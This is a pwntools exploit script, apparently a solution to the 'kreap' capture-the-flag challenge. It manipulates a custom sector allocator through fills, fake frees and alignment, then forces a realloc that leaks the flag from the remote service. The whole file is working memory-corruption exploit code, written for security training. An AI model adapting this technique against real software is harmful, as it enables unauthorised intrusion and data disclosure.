#!/bin/python3

from pwn import *
import os

exe = ELF("./chall")
context.binary = exe

HOST = os.environ.get("HOST", "kreap.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15007))


def main():

    r = remote(HOST, PORT)

    ## Exploit ##
    SLOT_NO = 0		# current slot number
    MS_SIZE = 3855		# number of nodes in a multisector
    GETLINE_INIT_SZ = 120  # initial size of the getline buffer
    FAKE_FREE_NODES = 15  # number of nodes to fake free
    KREAP_SECTOR_SIZE = 512  # size of a sector in the kreap (in bytes)
    NEXT_SECTOR = 0		# next sector number that will be allocated

    # Get near the end of the MS
    # Getline size gets always doubled
    SECTORS = [0] * 20
    SIZES = [0] * 20
    for i in range(20):
        SIZES[i] = (GETLINE_INIT_SZ) * (1 << i) - 1 - 1  # endl + nullbyte
        # add 8 bytes for the block size stored before the data at every allocation
        SECTORS[i] = (SIZES[i] + 1 + 1 + 8 +
                      KREAP_SECTOR_SIZE - 1) // KREAP_SECTOR_SIZE
        print("[+] Iteration {}: {} sectors (to trigger: {})".format(i,
              SECTORS[i], SIZES[i]))

    SECTORS_ALLOCATED = 0

    # Allocate the biggest size that doesn't trigger the ms overflow
    # Keep the nodes to fake free in the range: [MS_SIZE - FAKE_FREE_NODES * 2, MS_SIZE - FAKE_FREE_NODES]
    info("Filling the megasector with nodes...")
    while SECTORS_ALLOCATED < MS_SIZE - FAKE_FREE_NODES * 2:
        # Find the biggest size that doesn't get over MS_SIZE - FAKE_FREE_NODES
        for i in range(20):
            if SECTORS_ALLOCATED + SECTORS[i] > MS_SIZE - FAKE_FREE_NODES:
                break
        i -= 1
        warn("Allocating {} sectors".format(SECTORS[i]))

        store_data(r, SLOT_NO, b"A" * (SIZES[i]))
        SLOT_NO += 1

        SECTORS_ALLOCATED += SECTORS[i]
        NEXT_SECTOR += sum(SECTORS[:i+1])

    warn("SECTORS_ALLOCATED: {}".format(SECTORS_ALLOCATED))
    FAKE_FREE_NODES = MS_SIZE - SECTORS_ALLOCATED

    # Try to free nodes on the edge of the MS, the chunk has to be long at least ~20 nodes
    info("Fake freeing {} nodes on the edge of the megasector...".format(FAKE_FREE_NODES))

    # Allocate as many nodes as the end of the MS - 1
    for i in range(FAKE_FREE_NODES - 1):
        store_data(r, SLOT_NO + i, b"A")
        NEXT_SECTOR += 1

    # Fake free for each allocated
    for i in range(FAKE_FREE_NODES - 1):
        store_data(r, SLOT_NO + FAKE_FREE_NODES - 1, b"A")
        NEXT_SECTOR += 1
        erase_data(r, SLOT_NO + FAKE_FREE_NODES - 1)

    # Free each node previously allocated
    for i in range(FAKE_FREE_NODES - 1):
        erase_data(r, SLOT_NO + i)

    warn("NEXT_SECTOR: {}".format(NEXT_SECTOR))
    ALIGN_COUNT = 5 - NEXT_SECTOR % 8
    warn("Aligning to 5 (mod 8) using {} sectors...".format(ALIGN_COUNT))

    # Align the sectors to 5 mod 8
    for i in range(ALIGN_COUNT):
        store_data(r, SLOT_NO, b"A")
        SLOT_NO += 1

    # Load the flag
    info("Loading the flag...")
    load_flag(r)

    warn("Waiting for the write to be synced")
    sleep(30)

    # We trigger a realloc
    store_data(r, SLOT_NO, b"A"*GETLINE_INIT_SZ)
    SLOT_NO += 1

    warn(read_data(r, SLOT_NO - 1).decode())

    print(r.recvall(timeout=1))
    log.success(str(SLOT_NO + FAKE_FREE_NODES) + " slots used")
    r.close()


## Util functions ##
def load_flag(r):
    r.sendlineafter(b">", b"1")


def store_data(r, slot, data):
    r.sendlineafter(b">", b"2")
    r.sendlineafter(b">", str(slot).encode())
    r.sendlineafter(b">", data)


def read_data(r, slot):
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b">", str(slot).encode())
    return r.recvline().strip()


def erase_data(r, slot):
    r.sendlineafter(b">", b"5")
    r.sendlineafter(b">", str(slot).encode())


# execute code
if __name__ == "__main__":
    main()
